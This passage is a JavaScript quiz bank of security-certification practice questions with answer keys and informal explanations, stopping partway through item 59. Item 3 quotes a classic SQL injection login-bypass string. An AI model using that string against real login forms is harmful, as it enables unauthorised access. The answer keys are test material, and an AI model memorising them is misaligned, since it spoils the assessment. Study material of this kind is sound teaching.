
export const sets = {
  "set1": [
    {
    "question": "1. Ahmed is a sales manager with a major insurance company. He has received an email that is encouraging him to click on a link and fill out a survey. He is suspicious of the email, but it does mention a major insurance association, and that makes him think it might be legitimate. Which of the following best describes this attack?",
    "correct_answer": "C. Spear phishing",
    "incorrect_answers": [
      "A. Phishing",
      "B. Social engineering",
      "D. Trojan horse"
    ],
    "explanation": "Right, so this is called spear phishing. It's a sneaky email attack that's aimed at a specific person or group, like insurance salespeople in this case. Think of it like fishing with a spear – you're aiming for one particular fish, not just casting a wide net. It's a type of phishing, but much more targeted."
  },
  {
    "question": "2. You are a security administrator for a medium-sized bank. You have discovered a piece of software on your bank's database server that is not supposed to be there. It appears that the software will begin deleting database files if a specific employee is terminated. What best describes this?",
    "correct_answer": "B. Logic bomb",
    "incorrect_answers": [
      "A. Worm",
      "C. Trojan horse",
      "D. Rootkit"
    ],
    "explanation": "This is a classic logic bomb. Imagine a little ticking bomb made of code. It doesn't go off until a certain thing happens – in this case, an employee getting sacked. When the condition is met, BOOM, it does its damage. It's not a worm because it's not spreading, and it's not a Trojan because it's not hidden inside another program."
  },
  {
    "question": "3. You are responsible for incident response at Acme Bank. The Acme Bank website has been attacked. The attacker used the login screen, but rather than enter login credentials, they entered some odd text: ' or '1' = '1 . What is the best description for this attack?",
    "correct_answer": "C. SQL injection",
    "incorrect_answers": [
      "A. Cross-site scripting",
      "B. Cross-site request forgery",
      "D. ARP poisoning"
    ],
    "explanation": "That's a textbook SQL injection. The attacker is 'injecting' a bit of database code (SQL) into a login box. That tricky bit of text `' or '1'='1'` is a way to fool the database into thinking the login is correct, because '1' always equals '1'. It's like a secret password that can unlock many poorly made websites."
  },
  {
    "question": "4. Users are complaining that they cannot connect to the wireless network. You discover that the WAPs are being subjected to a wireless attack designed to block their Wi-Fi signals. Which of the following is the best label for this attack?",
    "correct_answer": "B. Jamming",
    "incorrect_answers": [
      "A. IV attack",
      "C. WPS attack",
      "D. Botnet"
    ],
    "explanation": "This is a jamming attack. It's like when someone shouts really loudly while you're trying to have a conversation. The attacker is creating a lot of 'noise' with a powerful radio signal to drown out the proper Wi-Fi signal, so no one can connect. It's basically a denial-of-service attack for Wi-Fi."
  },
  {
    "question": "5. Frank is deeply concerned about attacks to his company's ecommerce server. He is particularly worried about cross-site scripting and SQL injection. Which of the following would best defend against these two specific attacks?",
    "correct_answer": "B. Input validation",
    "incorrect_answers": [
      "A. Encrypted web traffic",
      "C. A firewall",
      "D. An IDS"
    ],
    "explanation": "The best defence here is input validation. Think of it like having a bouncer at a club. The bouncer (the input validation code) checks everyone's ID (the data being entered) to make sure it's what's expected. It stops people from trying to sneak in dodgy code for SQL injection or cross-site scripting. It's the most direct way to stop these kinds of attacks."
  },
  {
    "question": "6. You are responsible for network security at Acme Company. Users have been reporting that personal data is being stolen when using the wireless network. They all insist they only connect to the corporate wireless access point (AP). However, logs for the AP show that these users have not connected to it. Which of the following could best explain this situation?",
    "correct_answer": "C. Rogue access point",
    "incorrect_answers": [
      "A. Session hijacking",
      "B. Clickjacking",
      "D. Bluejacking"
    ],
    "explanation": "This sounds like a rogue access point. What's happened is a baddy has set up their own Wi-Fi hotspot with the same name as your company's official one. Your users think they're connecting to the right network, but they're actually connecting to the attacker's one. The attacker can then see all their internet traffic. It's also known as an 'evil twin' attack."
  },
  {
    "question": "7. What type of attack depends on the attacker entering JavaScript into a text area that is intended for users to enter text that will be viewed by other users?",
    "correct_answer": "C. Cross-site scripting",
    "incorrect_answers": [
      "A. SQL injection",
      "B. Clickjacking",
      "D. Bluejacking"
    ],
    "explanation": "This is Cross-Site Scripting, or XSS. It's a sneaky one. An attacker puts a bit of nasty computer script (usually JavaScript) into a part of a website where other people can see it, like a comments section. When another user views that page, the script runs in their browser and can do bad things, like steal their login details."
  },
  {
    "question": "8. Rick wants to make offline brute-force attacks against his password file very difficult for attackers. Which of the following is not a common technique to make passwords harder to crack?",
    "correct_answer": "D. Encrypting password plain text using symmetric encryption",
    "incorrect_answers": [
      "A. Use of a salt",
      "B. Use of a pepper",
      "C. Use of a purpose-built password hashing algorithm"
    ],
    "explanation": "Keeping the actual password, even if it's encrypted, is a bit old-fashioned and not the best way. Modern systems don't store your password at all. Instead, they use a special one-way process called 'hashing'. Using a 'salt' (a random bit of data added to each password before hashing) and a strong hashing algorithm makes it much, much harder for baddies to crack."
  },
  {
    "question": "9. What term is used to describe spam over Internet messaging services?",
    "correct_answer": "A. SPIM",
    "incorrect_answers": [
      "B. SMSPAM",
      "C. IMSPAM",
      "D. TwoFaceTiming"
    ],
    "explanation": "This one is a bit of an old-timer, but you need to know it. Unwanted messages over instant messaging (like WhatsApp or old-school AIM) is called SPIM. It's just a mash-up of 'spam' and 'IM' (Instant Messaging)."
  },
  {
    "question": "10. Susan is analyzing the source code for an application and discovers a pointer de-reference and returns NULL. This causes the program to attempt to read from the NULL pointer and results in a segmentation fault. What impact could this have for the application?",
    "correct_answer": "B. A denial-of-service condition",
    "incorrect_answers": [
      "A. A data breach",
      "C. Permissions creep",
      "D. Privilege escalation"
    ],
    "explanation": "Right, this one sounds complicated, but it's simple really. A 'segmentation fault' is just a fancy way of saying the program has crashed. If an attacker can make a program crash whenever they want, they can stop it from working for anyone. This is called a 'denial-of-service' because they are denying the service to legitimate users."
  },
  {
    "question": "11. Teresa is the security manager for a mid-sized insurance company. She receives a call from law enforcement, telling her that some computers on her network participated in a massive denial-of-service (DoS) attack. Teresa is certain that none of the employees at her company would be involved in a cybercrime. What would best explain this scenario?",
    "correct_answer": "C. The machines are bots.",
    "incorrect_answers": [
      "A. It is a result of social engineering.",
      "B. The machines all have backdoors.",
      "D. The machines are infected with crypto-viruses."
    ],
    "explanation": "Those computers have become 'bots' in a 'botnet'. This means they've been infected with malware that lets an attacker control them from afar, like little zombie computers. The employees have no idea their machines are being used to attack someone else. It's a common way for hackers to launch huge attacks."
  },
  {
    "question": "12. Unusual outbound network traffic, geographical irregularities, and increases in database read volumes are all examples of what key element of threat intelligence?",
    "correct_answer": "C. Indicators of compromise",
    "incorrect_answers": [
      "A. Predictive analysis",
      "B. OSINT",
      "D. Threat maps"
    ],
    "explanation": "These are all 'Indicators of Compromise,' or IoCs for short. Think of them as clues left behind by a burglar. A login from a country you've never been to? An IoC. Your computer suddenly sending out loads of data? An IoC. Security experts look for these clues to figure out if they've been hacked."
  },
  {
    "question": "13. Chris needs visibility into connection attempts through a firewall because he believes that a TCP handshake is not properly occurring. What security information and event management (SIEM) capability is best suited to troubleshooting this issue?",
    "correct_answer": "B. Packet capture",
    "incorrect_answers": [
      "A. Reviewing reports",
      "C. Sentiment analysis",
      "D. Log collection and analysis"
    ],
    "explanation": "To see what's really going on with a network connection, Chris needs to do a 'packet capture'. This is like recording the phone line. It lets him see every single piece of data (or 'packet') going back and forth, so he can see exactly where the 'handshake' (the start of a conversation between computers) is going wrong."
  },
  {
    "question": "14. Chris wants to detect a potential insider threat using his security information and event management (SIEM) system. What capability best matches his needs?",
    "correct_answer": "D. User behavior analysis",
    "incorrect_answers": [
      "A. Sentiment analysis",
      "B. Log aggregation",
      "C. Security monitoring"
    ],
    "explanation": "To spot a dodgy insider, Chris should use 'user behaviour analysis'. This is a clever tool that learns how people normally work. If someone suddenly starts accessing files they never touch, or logs in at 3 AM from a different country, the system flags it as weird behaviour. It's like a digital neighbourhood watch for your company."
  },
  {
    "question": "15. Chris has hundreds of systems spread across multiple locations and wants to better handle the amount of data that they create. What two technologies can help with this?",
    "correct_answer": "A. Log aggregation and log collectors",
    "incorrect_answers": [
      "B. Packet capture and log aggregation",
      "C. Security monitoring and log collectors",
      "D. Sentiment analysis and user behavior analysis"
    ],
    "explanation": "Chris needs 'log collectors' and 'log aggregation'. Imagine every computer writes its diary (a 'log'). Log collectors are like postmen who go and pick up all the diaries. Log aggregation is the central post office where all those diaries are put together in one place. It makes it much easier to read through everything instead of visiting each computer one by one."
  },
  {
    "question": "16. What type of security team establishes the rules of engagement for a cybersecurity exercise?",
    "correct_answer": "B. White team",
    "incorrect_answers": [
      "A. Blue team",
      "C. Purple team",
      "D. Red team"
    ],
    "explanation": "The 'White Team' are the referees. In a cybersecurity game, you have the attackers (the 'Red Team') and the defenders (the 'Blue Team'). The White Team sets the rules, makes sure no one cheats, and decides who wins. The 'Purple Team' is when the red and blue teams work together to make the company safer."
  },
  {
    "question": "17. Cynthia is concerned about attacks against an application programming interface (API) that her company provides for its customers. What should she recommend to ensure that the API is only used by customers who have paid for the service?",
    "correct_answer": "A. Require authentication.",
    "incorrect_answers": [
      "B. Install and configure a firewall.",
      "C. Filter by IP address.",
      "D. Install and use an IPS."
    ],
    "explanation": "The simplest and best way is to 'require authentication'. An API is like a special door for computer programs to talk to each other. By requiring authentication, you're making sure that every program that knocks on the door has a special key (like an 'API key') to prove it's a paying customer."
  },
  {
    "question": "18. What type of attack is based on sending more data to a target variable than the data can actually hold?",
    "correct_answer": "B. Buffer overflow",
    "incorrect_answers": [
      "A. Bluesnarfing",
      "C. Bluejacking",
      "D. Cross-site scripting"
    ],
    "explanation": "This is a 'buffer overflow'. Imagine you have a small box (the 'buffer') that's only meant to hold one apple. An attacker comes along and tries to stuff ten apples into it. The box overflows, and the extra apples spill out, making a mess and potentially breaking other things nearby. In computer terms, this can crash the program or even let the attacker run their own code."
  },
  {
    "question": "19. An email arrives telling Gurvinder that there is a limited time to act to get a software package for free and that the first 50 downloads will not have to be paid for. What social engineering principle is being used against him?",
    "correct_answer": "A. Scarcity",
    "incorrect_answers": [
      "B. Intimidation",
      "C. Authority",
      "D. Consensus"
    ],
    "explanation": "This is a classic case of 'scarcity'. The email is making it seem like the free software is a limited offer and will run out soon. This makes people panic and act quickly without thinking, which is exactly what the attacker wants. It's the same trick shops use when they say 'Limited stock!'."
  },
  {
    "question": "20. You have been asked to test your company network for security issues. The specific test you are conducting involves primarily using automated and semiautomated tools to look for known vulnerabilities with the various systems on your network. Which of the following best describes this type of test?",
    "correct_answer": "A. Vulnerability scan",
    "incorrect_answers": [
      "B. Penetration test",
      "C. Security audit",
      "D. Security test"
    ],
    "explanation": "This is a 'vulnerability scan'. It's like using a special scanner to check all the doors and windows of your house to see if any are unlocked. It's an automated way to find common, known weaknesses. A 'penetration test' is more hands-on; that's when you actually try to break in through the unlocked windows."
  },
  {
    "question": "21. Susan wants to reduce the likelihood of successful credential harvesting attacks via her organization's commercial websites. Which of the following is not a common prevention method aimed at stopping credential harvesting?",
    "correct_answer": "C. Use of complex usernames",
    "incorrect_answers": [
      "A. Use of multifactor authentication",
      "B. User awareness training",
      "D. Limiting or preventing use of third-party web scripts and plugins"
    ],
    "explanation": "Making usernames complex doesn't really help. 'Credential harvesting' is just a fancy term for stealing passwords. The best ways to stop this are using multifactor authentication (so the baddy needs more than just your password), training people not to fall for tricks, and being careful about what extra bits of code you add to your website."
  },
  {
    "question": "22. Greg wants to gain admission to a network which is protected by a network access control (NAC) system that recognized the hardware address of systems. How can he bypass this protection?",
    "correct_answer": "C. Use MAC cloning to clone a legitimate MAC address.",
    "incorrect_answers": [
      "A. Spoof a legitimate IP address.",
      "B. Conduct a denial-of-service attack against the NAC system.",
      "D. None of the above"
    ],
    "explanation": "Greg can use 'MAC cloning'. Every device has a unique hardware address, called a MAC address. If the network only lets certain MAC addresses in, Greg can find a legitimate one and 'clone' it, making his computer look like an approved device. It's like making a perfect copy of a key to get into a locked building."
  },
  {
    "question": "23. Coleen is the web security administrator for an online auction website. A small number of users are complaining that when they visit the website it does not appear to be the correct site. Coleen checks and she can visit the site without any problem, even from computers outside the network. She also checks the web server log and there is no record of those users ever connecting. Which of the following might best explain this?",
    "correct_answer": "A. Typo squatting",
    "incorrect_answers": [
      "B. SQL injection",
      "C. Cross-site scripting",
      "D. Cross-site request forgery"
    ],
    "explanation": "This is most likely 'typo squatting'. An attacker has registered a website with a name that's very similar to the real one, like 'amason.com' instead of 'amazon.com'. When users make a small typing mistake, they end up on the fake site, which is designed to look real so it can steal their login details. It's a simple but effective trick."
  },
  {
    "question": "24. The organization that Mike works in finds that one of their domains is directing traffic to a competitor's website. When Mike checks, the domain information has been changed, including the contact and other administrative details for the domain. If the domain had not expired, what has most likely occurred?",
    "correct_answer": "C. Domain hijacking",
    "incorrect_answers": [
      "A. DNS hijacking",
      "B. An on-path attack",
      "D. A zero-day attack"
    ],
    "explanation": "This is 'domain hijacking'. Someone has managed to get into the account where the company's domain name (like 'acme.com') is registered and has changed the details to point it somewhere else. It's like someone breaking into the post office and changing your address on all your mail so it gets delivered to their house instead."
  },
  {
    "question": "25. Mahmoud is responsible for managing security at a large university. He has just performed a threat analysis for the network, and based on past incidents and studies of similar networks, he has determined that the most prevalent threat to his network is low-skilled attackers who wish to breach the system, simply to prove they can or for some low-level crime, such as changing a grade. Which term best describes this type of attacker?",
    "correct_answer": "D. Script kiddie",
    "incorrect_answers": [
      "A. Hacktivist",
      "B. Amateur",
      "C. Insider"
    ],
    "explanation": "This describes a 'script kiddie'. These are people who aren't very skilled hackers themselves. They use tools and 'scripts' that other, cleverer people have made. They're often just doing it for a bit of fun, to show off, or for small gains, not for big political reasons or lots of money."
  },
  {
    "question": "26. How is phishing different from general spam?",
    "correct_answer": "B. It is intended to acquire credentials or other data.",
    "incorrect_answers": [
      "A. It is sent only to specific targeted individuals.",
      "C. It is sent via SMS.",
      "D. It includes malware in the message."
    ],
    "explanation": "The main difference is the goal. 'Spam' is just unwanted junk mail, like adverts. 'Phishing' is a specific type of attack where the email tries to trick you into giving away your information, like your password or credit card number. It's fishing for your data."
  },
  {
    "question": "27. Which of the following best describes a collection of computers that have been compromised and are being controlled from one central point?",
    "correct_answer": "B. Botnet",
    "incorrect_answers": [
      "A. Zombienet",
      "C. Nullnet",
      "D. Attacknet"
    ],
    "explanation": "This is a 'botnet'. It's an army of 'zombie' computers (or 'bots') that have been infected with malware. A hacker can control this whole army from one place to do bad things, like send spam or attack websites, without the owners of the computers even knowing."
  },
  {
    "question": "28. Selah includes a question in her procurement request-for-proposal process that asks how long the vendor has been in business and how many existing clients the vendor has. What common issue is this practice intended to help prevent?",
    "correct_answer": "B. Lack of vendor support",
    "incorrect_answers": [
      "A. Supply chain security issues",
      "C. Outsourced code development issues",
      "D. System integration and configuration issues"
    ],
    "explanation": "Selah is trying to avoid a 'lack of vendor support'. She wants to make sure the company she buys from is stable and isn't going to disappear in six months. If a company goes bust, there's no one to provide updates, fix problems, or offer support for the product, which can be a big security headache."
  },
  {
    "question": "29. John is conducting a penetration test of a client's network. He is currently gathering information from sources such as archive.org, netcraft.com, social media, and information websites. What best describes this stage?",
    "correct_answer": "B. Passive reconnaissance",
    "incorrect_answers": [
      "A. Active reconnaissance",
      "C. Initial exploitation",
      "D. Pivot"
    ],
    "explanation": "This is 'passive reconnaissance'. John is doing his homework without making any direct contact with the target's network. He's using public information, like a detective looking through public records. 'Active reconnaissance' would be when he starts to do things like scan their network, which is like rattling their doorknobs to see if they're locked."
  },
  {
    "question": "30. Alice wants to prevent SSRF attacks. Which of the following will not be helpful for preventing them?",
    "correct_answer": "A. Removing all SQL code from submitted HTTP queries",
    "incorrect_answers": [
      "B. Blocking hostnames like 127.0.01 and localhost",
      "C. Blocking sensitive URLs like /admin",
      "D. Applying whitelist-based input filters"
    ],
    "explanation": "Removing SQL code won't help here because SSRF (Server-Side Request Forgery) isn't about databases. It's an attack where you trick a server into making a web request to a location it shouldn't. Blocking the server from talking to itself (like 'localhost') or visiting sensitive pages is a good way to stop this."
  },
  {
    "question": "31. What type of attack is based on entering fake entries into a target network's domain name server?",
    "correct_answer": "A. DNS poisoning",
    "incorrect_answers": [
      "B. ARP poisoning",
      "C. XSS poisoning",
      "D. CSRF poisoning"
    ],
    "explanation": "This is 'DNS poisoning'. The DNS is like the internet's phonebook; it turns website names (like google.com) into computer-readable IP addresses. DNS poisoning is when a baddy messes with the phonebook, changing the entry for a real website to point to their own dodgy one instead."
  },
  {
    "question": "32. Frank has been asked to conduct a penetration test of a small bookkeeping firm. For the test, he has only been given the company name, the domain name for their website, and the IP address of their gateway router. What best describes this type of test?",
    "correct_answer": "C. An unknown environment test",
    "incorrect_answers": [
      "A. A known environment test",
      "B. External test",
      "D. Threat test"
    ],
    "explanation": "This is an 'unknown environment test,' also called a 'black-box' test. It's like asking a burglar to try and break into a house without giving them any blueprints or inside information. The tester has to figure everything out for themselves, just like a real attacker would."
  },
  {
    "question": "33. You work for a security company that performs penetration testing for clients. You are conducting a test of an e-commerce company. You discover that after compromising the web server, you can use the web server to launch a second attack into the company's internal network. What best describes this?",
    "correct_answer": "D. A pivot",
    "incorrect_answers": [
      "A. Internal attack",
      "B. Known environment testing",
      "C. Unknown environment testing"
    ],
    "explanation": "This is called a 'pivot'. You've broken into one system (the web server), and now you're using that system as a stepping stone to attack other, more secure systems inside the network. It's like getting into the garden shed and then using the tools in there to break into the main house."
  },
  {
    "question": "34. While investigating a malware outbreak on your company network, you discover something very odd. There is a file that has the same name as a Windows system DLL, and it even has the same API interface, but it handles input very differently, in a manner to help compromise the system, and it appears that applications have been attaching to this file, rather than the real system DLL. What best describes this?",
    "correct_answer": "A. Shimming",
    "incorrect_answers": [
      "B. Trojan horse",
      "C. Backdoor",
      "D. Refactoring"
    ],
    "explanation": "This is an attack called 'shimming'. A 'shim' is a bit of malicious code that wedges itself between a real program and a system file it needs to use. When the real program tries to talk to the system file, the shim intercepts the message and can do nasty things before passing it along. It's like a dodgy middle-man."
  },
  {
    "question": "35. Which of the following capabilities is not a key part of a SOAR (security orchestration, automation, and response) tool?",
    "correct_answer": "C. Automated malware analysis",
    "incorrect_answers": [
      "A. Threat and vulnerability management",
      "B. Security incident response",
      "D. Security operations automation"
    ],
    "explanation": "SOAR tools are all about making security teams faster and more efficient by automating their tasks. They help manage threats and respond to incidents automatically. While they might use the results of a malware analysis, they don't typically do the deep analysis of the malware itself. That's a job for a different, more specialised tool."
  },
  {
    "question": "36. John discovers that email from his company's email servers is being blocked because of spam that was sent from a compromised account. What type of lookup can he use to determine what vendors like McAfee and Barracuda have classified his domain as?",
    "correct_answer": "C. A domain reputation lookup",
    "incorrect_answers": [
      "A. An nslookup",
      "B. A tcpdump",
      "D. A SMTP whois"
    ],
    "explanation": "John needs to do a 'domain reputation lookup'. There are services online that keep a blacklist of servers known for sending spam. John can use these services to see if his company's email server has been put on the naughty list, which would explain why his emails are being blocked."
  },
  {
    "question": "37. Frank is a network administrator for a small college. He discovers that several machines on his network are infected with malware. That malware is sending a flood of packets to a target external to the network. What best describes this attack?",
    "correct_answer": "B. DDoS",
    "incorrect_answers": [
      "A. SYN flood",
      "C. Botnet",
      "D. Backdoor"
    ],
    "explanation": "This is a 'DDoS', or Distributed Denial-of-Service attack. The infected computers on Frank's network are all ganging up to flood a single target with so much junk traffic that it gets overwhelmed and stops working. Because the attack is coming from many different computers ('distributed'), it's a DDoS."
  },
  {
    "question": "38. Why is SSL stripping a particular danger with open Wi-Fi networks?",
    "correct_answer": "B. Open hotspots do not assert their identity in a secure way.",
    "incorrect_answers": [
      "A. WPA2 is not secure enough to prevent this.",
      "C. Open hotspots can be accessed by any user.",
      "D. 802.11ac is insecure and traffic can be redirected."
    ],
    "explanation": "The big problem with open Wi-Fi is that you can't be sure who you're connecting to. An attacker can easily set up a fake hotspot called 'Free Coffee Shop Wi-Fi'. When you connect, they can perform an 'SSL stripping' attack, which forces your secure (HTTPS) connection to become an insecure one (HTTP), letting them read all your data."
  },
  {
    "question": "39. A sales manager at your company is complaining about slow performance on his computer. When you thoroughly investigate the issue, you find spyware on his computer. He insists that the only thing he has downloaded recently was a freeware stock trading application. What would best explain this situation?",
    "correct_answer": "B. Trojan horse",
    "incorrect_answers": [
      "A. Logic bomb",
      "C. Rootkit",
      "D. Macro virus"
    ],
    "explanation": "This is a classic 'Trojan horse'. Just like the old Greek story, the spyware was hidden inside something that looked harmless (the stock trading app). When the manager installed the app, he unknowingly let the spyware onto his computer. It's a very common way for malware to spread."
  },
  {
    "question": "40. When phishing attacks are so focused that they target a specific high-ranking or important individual, they are called what?",
    "correct_answer": "D. Whaling",
    "incorrect_answers": [
      "A. Spear phishing",
      "B. Targeted phishing",
      "C. Phishing"
    ],
    "explanation": "This is called 'whaling'. When phishing attacks go after the big fish in a company, like the CEO or CFO, it's called whaling. It's a type of 'spear phishing' (which is just a targeted attack), but the term 'whaling' is used specifically for these very important targets."
  },
  {
    "question": "41. What type of threat actors are most likely to have a profit motive for their malicious activities?",
    "correct_answer": "D. Criminal syndicates",
    "incorrect_answers": [
      "A. State actors",
      "B. Script kiddies",
      "C. Hacktivists"
    ],
    "explanation": "When it's all about the money, you're usually looking at 'criminal syndicates'. These are organised crime groups who use hacking to make a profit, often through things like ransomware or stealing financial data. Other groups have different motives: state actors work for governments, hacktivists have political goals, and script kiddies are often just messing about."
  },
  {
    "question": "42. One of your users cannot recall the password for their laptop. You want to recover that password for them. You intend to use a tool/technique that is popular with hackers, and it consists of searching tables of precomputed hashes to recover the password. What best describes this?",
    "correct_answer": "A. Rainbow table",
    "incorrect_answers": [
      "B. Backdoor",
      "C. Social engineering",
      "D. Dictionary attack"
    ],
    "explanation": "This is a 'rainbow table'. Instead of trying to guess passwords one by one, a rainbow table is a massive, pre-made lookup list. It contains millions of common passwords and their corresponding 'hashes' (the scrambled version that computers store). By finding the matching hash in the table, you can quickly find the original password."
  },
  {
    "question": "43. What risk is commonly associated with a lack of vendor support for a product, such as an outdated version of a device?",
    "correct_answer": "B. Lack of patches or updates",
    "incorrect_answers": [
      "A. Improper data storage",
      "C. Lack of available documentation",
      "D. System integration and configuration issues"
    ],
    "explanation": "The biggest worry is a 'lack of patches or updates'. When a company stops supporting a product, they also stop releasing security updates for it. This means that if any new security holes ('vulnerabilities') are found, they will never be fixed, leaving the device as an open door for hackers."
  },
  {
    "question": "44. You have noticed that when in a crowded area, you sometimes get a stream of unwanted text messages. The messages end when you leave the area. What describes this attack?",
    "correct_answer": "A. Bluejacking",
    "incorrect_answers": [
      "B. Bluesnarfing",
      "C. Evil twin",
      "D. Rogue access point"
    ],
    "explanation": "This is 'bluejacking'. It's a bit of an old-school prank where someone sends anonymous messages to nearby Bluetooth-enabled phones. It's usually harmless, just annoying. 'Bluesnarfing' is the more dangerous version, where they actually try to steal data from your phone over Bluetooth."
  },
  {
    "question": "45. Dennis uses an on-path attack to cause a system to send HTTPS traffic to his system and then forwards it to the actual server the traffic is intended for. What type of password attack can he conduct with the data he gathers if he captures all the traffic from a login form?",
    "correct_answer": "A. A plain-text password attack",
    "incorrect_answers": [
      "B. A pass-the-hash attack",
      "C. A SQL injection attack",
      "D. A cross-site scripting attack"
    ],
    "explanation": "Because Dennis is in the middle of the conversation (an 'on-path' attack), he can see the password as it's typed in, before it's securely scrambled. This means he can just read it in 'plain text'. It's like a postman opening your letters to read them before delivering them."
  },
  {
    "question": "46. Someone has been rummaging through your company's trash bins seeking to find documents, diagrams, or other sensitive information that has been thrown out. What is this called?",
    "correct_answer": "A. Dumpster diving",
    "incorrect_answers": [
      "B. Trash diving",
      "C. Social engineering",
      "D. Trash engineering"
    ],
    "explanation": "This is called 'dumpster diving'. It's amazing what useful information people throw away without shredding it first! Attackers can find passwords, network diagrams, and all sorts of juicy details just by having a poke around in the bins. It's a low-tech but often very effective way of gathering information."
  },
  {
    "question": "47. Louis is investigating a malware incident on one of the computers on his network. He has discovered unknown software that seems to be opening a port, allowing someone to remotely connect to the computer. This software seems to have been installed at the same time as a small shareware application. Which of the following best describes this malware?",
    "correct_answer": "A. RAT",
    "incorrect_answers": [
      "B. Worm",
      "C. Logic bomb",
      "D. Rootkit"
    ],
    "explanation": "This sounds like a 'RAT', which stands for Remote Access Trojan. It's a type of malware that gives an attacker a 'backdoor' into your computer, allowing them to control it from anywhere in the world, just as if they were sitting in front of it. They often get installed secretly when you install another, seemingly harmless program."
  },
  {
    "question": "48. Jared is responsible for network security at his company. He has discovered behavior on one computer that certainly appears to be a virus. He has even identified a file he thinks might be the virus. However, using three separate antivirus programs, he finds that none can detect the file. Which of the following is most likely to be occurring?",
    "correct_answer": "B. The computer has a zero-day exploit.",
    "incorrect_answers": [
      "A. The computer has a RAT.",
      "C. The computer has a worm.",
      "D. The computer has a rootkit."
    ],
    "explanation": "This is likely a 'zero-day' exploit. A zero-day is a brand new type of attack that no one has ever seen before. Because it's new, the antivirus companies haven't had a chance to create a signature for it yet, so their software can't spot it. It's called 'zero-day' because the good guys have had zero days to prepare for it."
  },
  {
    "question": "49. Which of the following is not a common means of attacking RFID badges?",
    "correct_answer": "D. Birthday attacks",
    "incorrect_answers": [
      "A. Data capture",
      "B. Spoofing",
      "C. Denial-of-service"
    ],
    "explanation": "A 'birthday attack' is a maths trick used to crack scrambled data (cryptography). While RFID badges use some scrambling, this type of attack isn't a common way to go after them. It's much easier for an attacker to try and capture the data from the badge as it's being used, or just block the signal so it doesn't work at all (denial-of-service)."
  },
  {
    "question": "50. Your wireless network has been breached. It appears the attacker modified a portion of data used with the stream cipher and used this to expose wirelessly encrypted data. What is this attack called?",
    "correct_answer": "C. IV attack",
    "incorrect_answers": [
      "A. Evil twin",
      "B. Rogue WAP",
      "D. WPS attack"
    ],
    "explanation": "This is an 'IV attack'. An 'initialisation vector' (IV) is a bit of random data used to start off the encryption process in some older Wi-Fi security. Attackers found a weakness where they could figure out the encryption key by looking at lots of these IVs. It's a specific, old-school cryptographic attack."
  },
  {
    "question": "51. The company that Scott works for has experienced a data breach, and the personal information of thousands of customers has been exposed. Which of the following impact categories is not a concern as described in this scenario?",
    "correct_answer": "C. Availability loss",
    "incorrect_answers": [
      "A. Financial",
      "B. Reputation",
      "D. Data loss"
    ],
    "explanation": "There's no 'availability loss' mentioned here. Availability is about whether your systems are up and running. In this case, data has been lost, which will cost money to fix (financial impact) and will damage the company's good name (reputation impact). But there's nothing to say the website or services went offline."
  },
  {
    "question": "52. What type of attack exploits the trust that a website has for an authenticated user to attack that website by spoofing requests from the trusted user?",
    "correct_answer": "B. Cross-site request forgery",
    "incorrect_answers": [
      "A. Cross-site scripting",
      "C. Bluejacking",
      "D. Evil twin"
    ],
    "explanation": "This is 'Cross-Site Request Forgery' (CSRF or XSRF). It's a bit of a tricky one. Imagine you're logged into your online banking. An attacker sends you an email with a link. If you click that link while you're still logged in, it could secretly tell your bank to send money to the attacker. The website trusts the request because it came from your computer, but you didn't mean to send it."
  },
  {
    "question": "53. What purpose does a fusion center serve in cyberintelligence activities?",
    "correct_answer": "A. It promotes information sharing between agencies or organizations.",
    "incorrect_answers": [
      "B. It combines security technologies to create new, more powerful tools.",
      "C. It generates power for the local community in a secure way.",
      "D. It separates information by classification ratings to avoid accidental distribution."
    ],
    "explanation": "A 'fusion centre' is all about sharing information. It's a central hub where different groups—like the police, fire service, and private companies—can all share what they know about threats. By 'fusing' all their information together, they can get a much better picture of what's going on and work together to stop bad things from happening."
  },
  {
    "question": "54. CVE is an example of what type of feed?",
    "correct_answer": "B. A vulnerability feed",
    "incorrect_answers": [
      "A. A threat intelligence feed",
      "C. A critical infrastructure listing feed",
      "D. A critical virtualization exploits feed"
    ],
    "explanation": "CVE stands for 'Common Vulnerabilities and Exposures'. It's basically a massive dictionary of all the known security holes in software and hardware. A 'vulnerability feed' is an updating list that tells security tools about the latest CVEs, so they know what to look for."
  },
  {
    "question": "55. What type of attack is a birthday attack?",
    "correct_answer": "B. A cryptographic attack",
    "incorrect_answers": [
      "A. A social engineering attack",
      "C. A network denial-of-service attack",
      "D. A TCP/IP protocol attack"
    ],
    "explanation": "A 'birthday attack' is a clever maths trick used against scrambled data (cryptography). It's based on the 'birthday problem': in a group of just 23 people, there's a 50% chance two will share a birthday. Attackers use a similar idea to find two different messages that produce the same scrambled 'hash', which can help them break the security."
  },
  {
    "question": "56. Juanita is a network administrator for Acme Company. Some users complain that they keep getting dropped from the network. When Juanita checks the logs for the wireless access point (WAP), she finds that a deauthentication packet has been sent to the WAP from the users' IP addresses. What seems to be happening here?",
    "correct_answer": "B. Disassociation attack",
    "incorrect_answers": [
      "A. Problem with users' Wi-Fi configuration",
      "C. Session hijacking",
      "D. Backdoor attack"
    ],
    "explanation": "This is a 'disassociation attack'. The attacker is sending fake messages to the Wi-Fi access point, pretending to be the user's computer and saying 'I want to disconnect now'. This kicks the user off the network. The attacker might do this to annoy them, or to try and capture their password when they try to reconnect."
  },
  {
    "question": "57. John has discovered that an attacker is trying to get network passwords by using software that attempts a number of passwords from a list of common passwords. What type of attack is this?",
    "correct_answer": "A. Dictionary",
    "incorrect_answers": [
      "B. Rainbow table",
      "C. Brute force",
      "D. Session hijacking"
    ],
    "explanation": "This is a 'dictionary attack'. Instead of trying every single possible password (which is a 'brute force' attack), a dictionary attack uses a pre-made list, or 'dictionary', of common passwords like '123456', 'password', or 'qwerty'. It's much faster because so many people use simple, common passwords."
  },
  {
    "question": "58. You are a network security administrator for a bank. You discover that an attacker has exploited a flaw in OpenSSL and forced some connections to move to a weak cipher suite version of TLS, which the attacker could breach. What type of attack was this?",
    "correct_answer": "B. Downgrade attack",
    "incorrect_answers": [
      "A. Disassociation attack",
      "C. Session hijacking",
      "D. Brute force"
    ],
    "explanation": "This is a 'downgrade attack'. Modern secure connections (TLS) have lots of different ways to scramble data, some stronger than others. In this attack, the baddy tricks the connection into using an old, weak method of scrambling that they know how to break. They 'downgrade' the security to an easier level."
  },
  {
    "question": "59. When an attacker tries to find an input value that will produce the same hash as a password, what type of attack is this?",
    "correct_answer": "D. Collision attack",
    "incorrect_answers": [
      "A. Rainbow table",
      "B. Brute force",
      "C. Session hijacking"
    ],
